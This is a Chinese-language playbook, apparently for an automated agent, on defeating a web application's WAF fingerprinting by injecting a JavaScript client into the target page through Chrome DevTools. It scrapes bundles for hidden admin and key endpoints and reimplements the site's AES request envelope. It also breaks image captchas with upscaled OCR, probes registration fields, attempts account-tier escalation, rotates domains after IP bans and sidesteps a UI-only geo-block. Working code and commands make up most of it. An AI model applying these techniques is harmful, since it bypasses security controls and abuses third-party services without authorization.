# 把 API 客户端搬进浏览器：CDP + WebCrypto 自带信封

适用：目标被 WAF（阿里云/CF 等）按 **TLS/JS 指纹** 拦住非浏览器客户端，但**目标自己的前端在真实浏览器里跑得好好的**。
本机 python `urllib` / `requests` / `curl_cffi`（Chrome JA3 伪装）全部回阻断页：

```
您的访问请求可能对网站造成安全威胁，请求已被阻断。
```

而页面内 `fetch` 正常 ⇒ 掐的不是 IP，是传输指纹。**别在这条路上继续换 client / 补 UA / 补头，直接把客户端搬进浏览器。**

---

## 0. 判据：先证明「浏览器出得去、脚本出不去」

```javascript
// 页面内探针（Runtime.evaluate → awaitPromise）
(async()=>{try{const r=await fetch('/favicon.ico?t='+Date.now());return 'HTTP '+r.status;}catch(e){return 'ERR '+e.message;}})()
```

- 通 → WAF 放行浏览器，走本文方案。
- 连 `https://www.baidu.com/favicon.ico` 也失败 → **先怀疑浏览器自己的代理环境**（见文末坑 1），不是 WAF。

---

## 1. 注入工具箱（一次注入，全程复用）

通过 CDP `Runtime.evaluate` 把下面这段注进目标页面（同源，cookie/头自动带上）：

```javascript
(() => {
  const b64d = s => { const b = atob(s); const u = new Uint8Array(b.length);
    for (let i=0;i<b.length;i++) u[i]=b.charCodeAt(i); return u; };
  const b64e = u => { let s=''; for (let i=0;i<u.length;i++) s+=String.fromCharCode(u[i]); return btoa(s); };
  const tok = () => (document.cookie.match(/X-API-TOKEN=([^;]+)/)||[])[1];
  const uid = () => (document.cookie.match(/X-API-UUID=([^;]+)/)||[])[1];
  const H = () => ({'Content-Type':'application/json;charset=UTF-8',
    'X-API-CLIENT':'h5','X-API-XXX':'/agent/api','X-API-VERSION':'1.0.0',
    'X-API-SITE':'4002','X-API-TYPE':'h5',
    'X-API-TOKEN':tok()||'','X-API-UUID':uid()||''});
  window.__T4 = {
    tok, uid, H, b64d, b64e,
    getKey: async () => {
      const r = await fetch('/agent/api/v1/front/Hf6dtBdmHx',
        {method:'POST', headers:H(), body:'{}', credentials:'include'});
      const j = await r.json(); const d = j.data || j;
      window.__T4.K = d.k; window.__T4.V = d.v; return d;
    },
    // ★ 关键：用原生 WebCrypto 做 AES-256-CBC，不需要 CryptoJS
    enc: async (obj, k, v) => {
      const key = await crypto.subtle.importKey('raw', b64d(k), {name:'AES-CBC'}, false, ['encrypt']);
      const ct  = await crypto.subtle.encrypt({name:'AES-CBC', iv: b64d(v)}, key,
                    new TextEncoder().encode(JSON.stringify(obj)));
      return b64e(new Uint8Array(ct));
    },
    dec: async (c, k, v) => {
      const key = await crypto.subtle.importKey('raw', b64d(k), {name:'AES-CBC'}, false, ['decrypt']);
      return new TextDecoder().decode(
        await crypto.subtle.decrypt({name:'AES-CBC', iv: b64d(v)}, key, b64d(c)));
    },
    // 明文体 / 加密体双模（同一后端里两种并存，见 §2）
    call: async (path, obj, encrypted) => {
      let body = obj;
      if (encrypted !== false && obj && typeof obj === 'object') {
        const K = window.__T4.K || '<兜底常量key>', V = window.__T4.V || K;
        body = {x: await window.__T4.enc(obj, K, V)};
      }
      const r = await fetch(path, {method:'POST', headers:H(),
        body: JSON.stringify(body||{}), credentials:'include'});
      const t = await r.text();
      try {
        let j = JSON.parse(t);
        if (j && j.x) { try { j = JSON.parse(await window.__T4.dec(j.x, window.__T4.K, window.__T4.V)); } catch(e){} }
        return j;
      } catch(e) { return {_raw: t.slice(0,500)}; }
    }
  };
  return 'ok token=' + (tok()||'NONE').slice(0,12);
})()
```

自检（必须做，一次就够）：

```javascript
(async()=>{const c=await window.__T4.enc({a:1},window.__T4.K,window.__T4.V);
  return 'cipher='+c.slice(0,24)+' decrypt='+await window.__T4.dec(c,window.__T4.K,window.__T4.V);})()
// 期望 decrypt={"a":1}；不一致 = base64/IV/编码链有问题，别往下走
```

驱动侧（Python）用 `websocket-client` 直连 `http://127.0.0.1:9222` 的 `webSocketDebuggerUrl`，
`Runtime.evaluate` + `returnByValue:true` + `awaitPromise:true` 取返回值即可；本技能
`references/cdp-driven-browser-and-captcha-loop.md` 与 `white-label-platform-recon` 的
`scripts/cdp_driver.py` 是现成驱动。

---

## 2. 端点表与「包装函数」从 chunk 文本 grep（不是从 UI）

```javascript
(async () => {
  const urls = performance.getEntriesByType('resource').map(r=>r.name).filter(n=>n.endsWith('.js'));
  const all = new Set();
  for (const u of urls) {
    try { const t = await (await fetch(u)).text();
      (t.match(/\/(site|agent|page)\/api\/v1\/[A-Za-z0-9_\/\-]+/g)||[]).forEach(x=>all.add(x));
    } catch(e) {}
  }
  return JSON.stringify([...all].sort());
})()
```

实测代理端一次拿到 **67 条**，含 `/unlimitedAgent/add`、`/member/registerFlow`、
`/security/verifyAdminSmsCode`、`/security/getRsaPrivateKey` 等 **UI 里点不到的门**。

再按关键词取上下文窗口，读出**包装函数原文**——它同时给出信封字段名、是否加密、参数形状：

```javascript
function d(e){ return WH().then(t => POST("/agent/api/v1/unlimitedAgent/add", {
  body: JSON.stringify({X: HI(JSON.stringify(e), {key: tV(t.k), iv: tV(t.v)})}) })) }
```

- `WH()` = 取密钥端点调用 · `tV()` = `decodeURIComponent(atob(x))` · `HI()` = AES 加密
- ⇒ 落到 Python 就是「POST 密钥口取 `k/v` → base64 解码 → AES-256-CBC → `{"x":<b64>}`」
- **同一后端明文体与加密体并存**：登录 `loginFlow` 是 `body: JSON.stringify(e)`（**明文 JSON**），
  注册 `registerFlow` 与业务写接口才是 `{X: HI(...)}` ⇒ 逐端点读调用点，别整套统一加密。

常用关键词：`registerFlow` `loginFlow` `Hf6dtBdmHx` `HI:` `WH:` `tV:` + 业务动词。

---

## 3. 验证码：`x-code` 响应头 = 会话 ID，OCR 前先 4 倍放大

```
GET /agent/api/v1/member/validateCode?t=<随机>
→ Content-Type: image/png   （★ 裸 PNG 体，不是 JSON —— 别用 json() 解析）
→ 响应头 x-code: 394790853071607535   ← 这就是提交时的 XCodeId
→ 响应头 x-remote-addr / http-geo-ipcountry / ratelimit-limit  ← 顺带告诉你出口身份与配额
```

提交字段：`XCode` = 图上字符，`XCodeId` = `x-code` 头的值。用 `curl -D - -o cap.png` 一并拿下。

**OCR 必须先放大**（本案唯一能把准确率从「读错」拉到「3/3 全对」的一步）：

```python
from PIL import Image
im = Image.open('cap.png')                       # 130x50
im.resize((im.width*4, im.height*4), Image.NEAREST).save('cap4x.png')   # 最近邻，不要双线性
```

- 原图直接喂 ddddocr 会**读错**（实测把图上的 `B W Y` 读成 `rdwy`）；4 倍最近邻放大后与人工判读**逐字一致**（3/3）。
- ddddocr 返回**小写**，而实测该平台登录**大小写不敏感**（小写码被接受）；但注册/业务口未必，**关键提交用视觉复核一次**再发。
- 图在页面里是 `blob:` URL：`canvas.drawImage(img,0,0,w*4,h*4)` 且 `ctx.imageSmoothingEnabled=false` 后 `toDataURL()` 即可导出。
- **提交后验证码图刷新 = 请求真的到了服务端**（只是码错/被业务拒）；**毫无反应且图不刷新 = 请求没发出** —— 用这个区分契约问题与点击没生效。

---

## 4. 账号**等级闸** ≠ 认证闸 ≠ 参数闸

三态要分开读，否则会把「等级不够」误报成「没打通」：

| 响应 | 含义 |
|---|---|
| `{"message":"当前代理未开通无限极","status_code":6001}` | **认证通过、参数通过、验证码被接受**，只是**账号等级不足**（`unlimitedAgent/*` 是「无限极」代理商专属） |
| `6001 ... 30分钟内无任何操作 ... 将自动退出登录` | 会话过期（**不是**权限问题）——补验证码重登即可，属**可续期据点** |
| `6003 非法请求` | 缺请求头（`X-API-XXX`/`X-API-TYPE` 一族），**别去改 body** |
| `6008` + 具名字段 | 契约未对齐，继续抠 bundle |
| 泛化文案（`注册失败`）跨域名/跨渠道一致 | **平台级策略关闭**，停手换面 |

等级字段试过但它们**不落库**：`POST /member/updateAgentConfig` 传 `agentModel`/`sysType`/`isCaptain`
回 `{"message":"成功"}`，而回读 `getAgentInfo` 字段纹丝不动 ⇒ **服务端白名单，别把「回成功」当提权成功**。

---

## 5. 免鉴权注册/登录口 + 增量参数探测

同一后端上常同时存在**完全不需要 token** 的注册与登录口：

```
POST /agent/api/v1/member/loginFlow      body = 明文 JSON         → 成功回 token
POST /agent/api/v1/member/registerFlow   body = {X: AES(参数)}    → 成功回 token
POST /agent/api/v1/front/Hf6dtBdmHx      body = {}                → {k,v} 信封密钥
```

**参数名用「增量探测法」拿** —— 服务端的报错就是文档：发 `{}` → 报第一个必填字段 → 补上 → 报下一个。

```
{}                      → 用户名为4-11首位为字母，最少2个字母+数字的组合
{name: <合法9位>}        → 密码必须是32位MD5加密串
{name, password: <32hex>} → （继续补下一个字段）
```

判定要点：**报错指向具体字段 = 契约未对齐（继续补）；不指向任何字段且跨渠道一致 = 运营方关掉了该功能**。
字段名常被运营拼错（`Kaptchcate` / `kaptchcate` 两套并存）—— **原样照抄，别「修正」**。

---

## 6. 坑

1. **浏览器会继承 shell 的代理环境变量，死代理会伪装成「目标封了我」。**
   从残留 `ALL_PROXY=socks5h://…`（Tor 已退）的 shell 启动的 Chromium，页面内连
   `favicon.ico`、`baidu.com` 都 `Failed to fetch`，导航停在 `chrome-error://chromewebdata/`。
   启浏览器一律：
   ```bash
   env -u ALL_PROXY -u all_proxy -u HTTP_PROXY -u http_proxy -u HTTPS_PROXY -u https_proxy \
       no_proxy='*' NO_PROXY='*' /snap/bin/chromium --headless=new --no-sandbox \
       --remote-debugging-port=9222 --user-data-dir=/tmp/prof --window-size=500,900
   ```
   且**每次操作前先打一发外部探针**再读业务响应。
2. **`webpackChunk_N_E.push([[id],{},cb])` 取 `__webpack_require__` 的写法不保证可用** ——
   实测抛 `Cannot read properties of undefined (reading 'call')`。别在它上面耗：规格照样能从
   **chunk 文本 grep** 读到（§2），运行时执行用 **WebCrypto 自己实现**（§1）。
3. **移动端 H5 表单别用 CDP 硬点。** 实测提交按钮 `disabled:false`、`type=submit`、
   `reactProps` 有 `onClick`/`onTouchStart`，但合成 input、`Input.insertText`、真实鼠标点击、
   `button.click()`、`form.requestSubmit()`、原生 `submit` 事件、直调 `props.onClick` **全部零请求**；
   `elementFromPoint` 证明没被遮挡（全屏水印层是 `pointer-events:none`）。⇒ 回到 §2 抠提交函数直调。
4. **同一 token 跨孪生域名有效**：会话是后端级的，不绑 Host。一个入口的 IP 被封
   （`HTTP 000` / `chrome-error://`）时，把 `preInfo` 域名表逐域名刷一遍，换没被封的那个继续。
5. **地区闸常常只罩 UI**：UI 被 302 到 `/other/restrictionIp` 而 API 照回 JSON，
   响应头 `x-remote-addr`/`http-geo-ipcountry` 是现成的证据。
